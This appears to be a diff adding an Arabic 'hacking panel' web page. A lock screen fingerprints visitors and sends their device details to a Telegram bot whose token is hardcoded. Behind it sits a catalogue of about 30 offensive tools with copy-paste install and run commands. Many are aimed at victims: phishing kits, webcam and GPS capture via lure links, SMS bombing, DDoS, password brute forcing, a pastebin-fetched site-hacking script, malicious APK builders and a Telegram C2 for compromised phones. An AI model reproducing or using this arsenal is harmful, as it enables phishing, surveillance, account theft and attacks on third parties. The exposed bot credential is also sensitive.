@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JAX☠️PIRATE-S1 | ELITE HACKING PANEL</title>
+    <style>
+        /* التنسيق العام (الأزرق المشع) */
+        :root {
+            --neon-blue: #00d4ff;
+            --deep-blue: #001a2e;
+            --dark-bg: #00050a;
+            --glow: 0 0 15px #00d4ff;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--neon-blue);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        /* شاشة القفل والتحقق */
+        .lock-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, var(--deep-blue) 0%, #000 100%);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 10000;
+        }
+
+        .login-card {
+            background: rgba(0, 10, 20, 0.9);
+            border: 2px solid var(--neon-blue);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 212, 255, 0.2);
+            max-width: 450px;
+            width: 90%;
+        }
+
+        .device-id-box {
+            background: #000;
+            color: #ff0055;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px dashed var(--neon-blue);
+            font-weight: bold;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+        }
+
+        input {
+            background: transparent;
+            border: 1px solid var(--neon-blue);
+            color: #fff;
+            padding: 15px;
+            width: 90%;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.1rem;
+        }
+
+        button {
+            background: var(--neon-blue);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            box-shadow: 0 0 30px var(--neon-blue);
+            background: #fff;
+        }
+
+        /* المحتوى الرئيسي */
+        .hidden { display: none; }
+        
+        header {
+            text-align: center;
+            padding: 50px 20px;
+            background: linear-gradient(to bottom, #001a2e, transparent);
+        }
+
+        .glitch-text {
+            font-size: 3rem;
+            font-weight: bold;
+            text-shadow: var(--glow);
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: skew(0deg); }
+            20% { transform: skew(2deg); color: #fff; }
+            40% { transform: skew(-2deg); }
+            100% { transform: skew(0deg); }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 25px;
+            position: relative;
+        }
+
+        /* تأثير الضباب الأزرق خلف الكروت */
+        .grid::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0,212,255,0.05) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        /* كرت الأداة */
+        .tool-card {
+            background: rgba(0, 20, 40, 0.8);
+            border: 1px solid #004455;
+            border-radius: 15px;
+            padding: 25px;
+            transition: 0.4s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-card:hover {
+            border-color: var(--neon-blue);
+            transform: translateY(-10px);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
+        }
+
+        .tool-card h3 {
+            margin-top: 20px;
+            color: #fff;
+            border-bottom: 2px solid var(--neon-blue);
+            padding-bottom: 10px;
+        }
+
+        .dev-tag {
+            background: #ff0055;
+            color: #fff;
+            font-size: 0.7rem;
+            padding: 3px 8px;
+            border-radius: 3px;
+            position: absolute;
+            top: 20px; left: 20px;
+        }
+
+        .usage-box {
+            background: #000;
+            color: #00ffaa;
+            padding: 10px;
+            font-size: 0.85rem;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #00ffaa;
+        }
+
+        button:active {
+            transform: scale(0.95);
+            background: #fff;
+            box-shadow: 0 0 50px var(--neon-blue);
+        }
+
+        /* شريط التمرير الهكر */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: var(--neon-blue); border-radius: 10px; }
+
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: #444;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="lock-screen" class="lock-overlay">
+        <div class="login-card">
+            <h2 style="margin:0;">SYSTEM AUTHENTICATION</h2>
+            <p style="color: #888;">مرحباً بك في لوحة JAX القرصان</p>
+            <div class="device-id-box" id="device-id-display">GENERATING ID...</div>
+            <button id="send-btn" onclick="requestAccess()" style="background: #111; color: var(--neon-blue); border: 1px solid var(--neon-blue); margin-bottom: 15px;">ارسال المعرف للقائد 📡</button>
+            <input type="text" id="access-token" placeholder="أدخل كود الفتح">
+            <button onclick="unlock()">تحقق من الصلاحيات 🔓</button>
+            <p id="log-msg" style="font-size: 12px; margin-top: 10px;"></p>
+        </div>
+    </div>
+
+    <div id="main-content" class="hidden">
+        <header>
+            <pre style="font-size: 10px; color: #fff; opacity: 0.7;">
+   ██╗ █████╗ ██╗  ██╗██████╗ ██╗██████╗  █████╗ ████████╗███████╗
+   ██║██╔══██╗╚██╗██╔╝██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
+   ██║███████║ ╚███╔╝ ██████╔╝██║██████╔╝███████║   ██║   █████╗  
+   ██║██╔══██║ ██╔██╗ ██╔═══╝ ██║██╔══██╗██╔══██║   ██║   ██╔══╝  
+   ██║██║  ██║██╔╝ ██╗██║     ██║██║  ██║██║  ██║   ██║   ███████╗
+   ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
+            </pre>
+            <h1 class="glitch-text">JAX☠️PIRATE-S1</h1>
+            <p>قائمة الأدوات المتقدمة لاختراق الأنظمة والشبكات</p>
+        </header>
+
+        <div class="container">
+            <div class="grid" id="tools-grid">
+                </div>
+        </div>
+
+        <footer>
+            JAX.COM | DEVELOPED BY HUNTER | VERSION 5.0.1
+        </footer>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8484099228:AAFWdHj7YdpP95pdU1ssjgFzjsNqntVu3WE";
+        const ADMIN_ID = "8133357563";
+        const SECRET = "BLACK_PIRATE_2026";
+
+        const fingerprint = btoa(navigator.userAgent).substring(15, 25).toUpperCase();
+        const displayID = "JAX-HID-" + fingerprint;
+        document.getElementById('device-id-display').innerText = displayID;
+
+        async function requestAccess() {
+            const log = document.getElementById('log-msg');
+            log.innerText = "جاري إرسال المعرف للبوت...";
+            const text = `⚠️ طلب دخول جديد:\n🆔 المعرف: ${displayID}\n👤 الجهاز: ${navigator.platform}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`;
+            
+            try {
+                await fetch(url);
+                log.style.color = "#00ffaa";
+                log.innerText = "تم الإرسال! اطلب الكود الآن من القائد.";
+            } catch (e) {
+                log.style.color = "red";
+                log.innerText = "فشل الاتصال بالبوت.";
+            }
+        }
+
+        function unlock() {
+            const input = document.getElementById('access-token').value.trim();
+            const correct = btoa(fingerprint + SECRET).substring(0, 10).toUpperCase();
+            
+            if (input === correct) {
+                document.getElementById('lock-screen').style.display = 'none';
+                document.getElementById('main-content').classList.remove('hidden');
+                renderTools();
+            } else {
+                alert("❌ كود غير صالح لهذا الجهاز!");
+            }
+        }
+
+        const toolsData = [
+            { name: "1. Zphisher", dev: "htr-tech", desc: "أداة صيد 30+ صفحة تواصل.", cmd: "pkg install git php curl openssh -y && git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh", usage: "اختر المنصة وارسل الرابط للضحية." },
+            { name: "2. Metasploit", dev: "Rapid7", desc: "إطار عمل لاختراق الأنظمة والأجهزة.", cmd: "wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh && chmod +x metasploit.sh && ./metasploit.sh", usage: "اكتب msfconsole للبدء." },
+            { name: "3. SQLMap", dev: "sqlmapproject", desc: "استغلال ثغرات الحقن وسحب البيانات.", cmd: "pkg install python git -y && git clone https://github.com/sqlmapproject/sqlmap && cd sqlmap && python3 sqlmap.py", usage: "python3 sqlmap.py -u 'URL' --dbs" },
+            { name: "4. SocialFish", dev: "UndeadSec", desc: "لوحة تحكم كاملة لصيد الحسابات.", cmd: "git clone https://github.com/UndeadSec/SocialFish && cd SocialFish && pip install -r requirements.txt && python3 SocialFish.py", usage: "افتح localhost:5000 في المتصفح." },
+            { name: "5. PhoneInfoga", dev: "sundowndev", desc: "جمع معلومات دقيقة عن أي رقم هاتف.", cmd: "git clone https://github.com/sundowndev/phoneinfoga && cd phoneinfoga && pip install -r requirements.txt", usage: "python3 phoneinfoga.py -n +967xxxx" },
+            { name: "6. SayCheese", dev: "thelinuxchoice", desc: "سحب صور من كاميرا الضحية.", cmd: "git clone https://github.com/thelinuxchoice/saycheese && cd saycheese && bash saycheese.sh", usage: "اختر Cloudflare وارسل الرابط." },
+            { name: "7. Inshackle", dev: "mishakorzik", desc: "زيادة متابعين أو تخمين انستقرام.", cmd: "git clone https://github.com/mishakorzik/Inshackle && cd Inshackle && bash inshackle.sh", usage: "اختر نوع الهجوم واتبع التعليمات." },
+            { name: "8. Nmap", dev: "nmap.org", desc: "فحص المنافذ واكتشاف الثغرات.", cmd: "pkg install nmap -y && nmap -v -A [target]", usage: "استبدل [target] بالـ IP المطلوب." },
+            { name: "9. IP-Tracer", dev: "palahsu", desc: "تتبع وتحديد موقع الـ IP.", cmd: "git clone https://github.com/palahsu/IP-Tracer && cd IP-Tracer && chmod +x install && ./install", usage: "trace -t [IP]" },
+            { name: "10. Tool-X", dev: "Z4nzu", desc: "تثبيت 300+ أداة اختراق بضغطة واحدة.", cmd: "git clone https://github.com/Z4nzu/Tool-X && cd Tool-X && ./install.aex", usage: "اكتب Tool-X في ترمكس." },
+            { name: "11. Bot Maker", dev: "TelegramAPI", desc: "بيئة بناء وتشفير البوتات.", cmd: "pkg install python -y && pip install pyTelegramBotAPI telebot requests", usage: "استخدم مكتبة telebot لبناء السكربت." },
+            { name: "12. Blackbird", dev: "p1ngul1n0", desc: "بحث عن حسابات عبر اليوزرنيم.", cmd: "git clone https://github.com/p1ngul1n0/blackbird && cd blackbird && pip install -r requirements.txt", usage: "python3 blackbird.py -u [user]" },
+            { name: "13. Shark", dev: "T-Dynamos", desc: "صيد باسووردات شبكات الواي فاي.", cmd: "git clone https://github.com/T-Dynamos/shark && cd shark && bash shark.sh", usage: "تعمل كصفحة هبوط للشبكة." },
+            { name: "14. DarkFly", dev: "Ranginang67", desc: "مجموعة ضخمة من أدوات التخمين.", cmd: "git clone https://github.com/Ranginang67/DarkFly-Tool && cd DarkFly-Tool && python2 install.py", usage: "اكتب DarkFly للتشغيل." },
+            { name: "15. JAX SETUP", dev: "JAX☠️PIRATE", desc: "تثبيت أساسيات ترمكس الكاملة.", cmd: "pkg update && pkg upgrade -y && pkg install python python2 php git curl wget nodejs ruby perl zip unzip -y", usage: "شغله عند أول استخدام لترمكس." }
+        ];
+
+        const moreTools = [
+            { name: "16. PyPhisher", dev: "KasRoudra", desc: "صيد متطور يتجاوز الحماية.", cmd: "git clone https://github.com/KasRoudra/PyPhisher && cd PyPhisher && python3 pyphisher.py", usage: "يدعم أكثر من 77 منصة." },
+            { name: "17. HiddenEye", dev: "DarkSec", desc: "احتيال مع سحب GPS ومعلومات الجهاز.", cmd: "git clone https://github.com/DarkSecDevelopers/HiddenEye && cd HiddenEye && python3 HiddenEye.py", usage: "فعل خيار الموقع الجغرافي." },
+            { name: "18. Wifite2", dev: "derv82", desc: "اختراق شبكات الواي فاي تلقائياً.", cmd: "git clone https://github.com/derv82/wifite2 && cd wifite2 && sudo python3 setup.py install", usage: "يتطلب كرت واي فاي يدعم Monitor Mode." },
+            { name: "19. Sherlock", dev: "sherlock", desc: "مطارد الحسابات في جميع المواقع.", cmd: "git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip install -r requirements.txt", usage: "python3 sherlock.py [user]" },
+            { name: "20. PhoneInfoga V2", dev: "sundowndev", desc: "فحص أرقام متقدم وتحديث 2026.", cmd: "python3 phoneinfoga.py scan -n [number]", usage: "استخدم الصيغة الدولية دائماً." },
+            { name: "21. WebDav", dev: "BDS-Team", desc: "رفع الاندكس واختراق المواقع.", cmd: "pip2 install urllib3 && wget https://pastebin.com/raw/B99zhZ9y -O webdav.py", usage: "python2 webdav.py [URL] [file]" },
+            { name: "22. Hammer", dev: "cyweb", desc: "هجوم حجب الخدمة DDoS القوي.", cmd: "git clone https://github.com/cyweb/hammer && cd hammer && python3 hammer.py", usage: "python3 hammer.py -s [IP] -p 80" },
+            { name: "23. T-Bomber", dev: "TheSpeedX", desc: "قنبلة الرسائل SMS المزعجة.", cmd: "git clone https://github.com/TheSpeedX/TBomb && cd TBomb && ./TBomb.sh", usage: "ادخل الرقم والكمية." },
+            { name: "24. Ngrok", dev: "inconshreveable", desc: "فتح بورتات السيرفر للعالم.", cmd: "pkg install wget && wget https://bin.equinox.io/c/4VmD4zmjqxY/ngrok-stable-linux-arm.zip", usage: "./ngrok http 8080" },
+            { name: "25. Nikto", dev: "sullo", desc: "فاحص ثغرات الويب الشامل.", cmd: "git clone https://github.com/sullo/nikto && cd nikto/program && ./nikto.pl -h [URL]", usage: "يكشف الثغرات المخفية." },
+            { name: "26. Seekers", dev: "thewhiteh4t", desc: "سحب إحداثيات GPS الضحية بدقة.", cmd: "git clone https://github.com/thewhiteh4t/seeker && cd seeker && python3 seeker.py -t manual", usage: "ارسل الرابط وانتظر الخريطة." },
+            { name: "27. Venom", dev: "r00t-3xp10it", desc: "صناعة بايلودات غير مكشوفة.", cmd: "git clone https://github.com/r00t-3xp10it/venom && cd venom && ./install.sh", usage: "يستخدم لصناعة APK ملغم." },
+            { name: "28. Hydra", dev: "van Hauser", desc: "أسرع أداة تخمين للباسووردات.", cmd: "pkg install hydra -y", usage: "hydra -l [user] -P [passlist] [ip] ssh" },
+            { name: "29. C2 Maker", dev: "JAX☠️PIRATE", desc: "كورس بناء سيرفرات التحكم بالبوتات.", cmd: "pip install telebot flask requests aiohttp", usage: "لربط الهواتف المخترقة ببوت تلجرام." },
+            { name: "30. JAX-Destroyer", dev: "JAX☠️PIRATE", desc: "تثبيت كل أدوات الترسانة بضغطة واحدة.", cmd: "pkg update -y && pkg upgrade -y && pkg install python python2 php git curl wget zip unzip tar perl ruby nodejs openssh nmap hydra -y", usage: "الأمر الشامل للقائد." }
+        ];
+
+        function renderTools() {
+            const grid = document.getElementById('tools-grid');
+            grid.innerHTML = ""; 
+            const allTools = [...toolsData, ...moreTools];
+            allTools.forEach(t => {
+                grid.innerHTML += `
+                    <div class="tool-card">
+                        <span class="dev-tag">${t.dev}</span>
+                        <h3>${t.name}</h3>
+                        <p style="font-size: 0.9rem; color: #ccc;">${t.desc}</p>
+                        <div class="usage-box">💡 <b>الاستخدام:</b> ${t.usage}</div>
+                        <button onclick="copyToClipboard('${t.cmd}')">COPY COMMANDS</button>
+                    </div>
+                `;
+            });
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            alert("✅ تم نسخ أوامر التثبيت والتشغيل!");
+        }
+    </script>
+</body>
+</html>
